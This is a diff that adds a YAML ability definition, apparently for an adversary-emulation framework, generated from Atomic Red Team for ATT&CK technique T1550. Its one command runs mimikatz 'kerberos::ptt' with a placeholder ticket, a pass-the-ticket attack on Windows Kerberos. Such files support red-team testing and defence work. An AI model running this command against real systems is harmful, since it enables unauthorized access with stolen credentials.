@@ -1,0 +1,12 @@
+- id: 67930a84-5f15-4dac-95e2-81460ea36828
+  name: Use Alternate Authentication Material
+  description: Ability for Use Alternate Authentication Material (ATT&CK T1550). Generated
+    from Atomic Red Team procedures; review and test safely before use.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1550
+    name: Use Alternate Authentication Material
+  platforms:
+    windows:
+      psh:
+        command: '"#{mimikatz_exe}" "kerberos::ptt #{ticket}"'
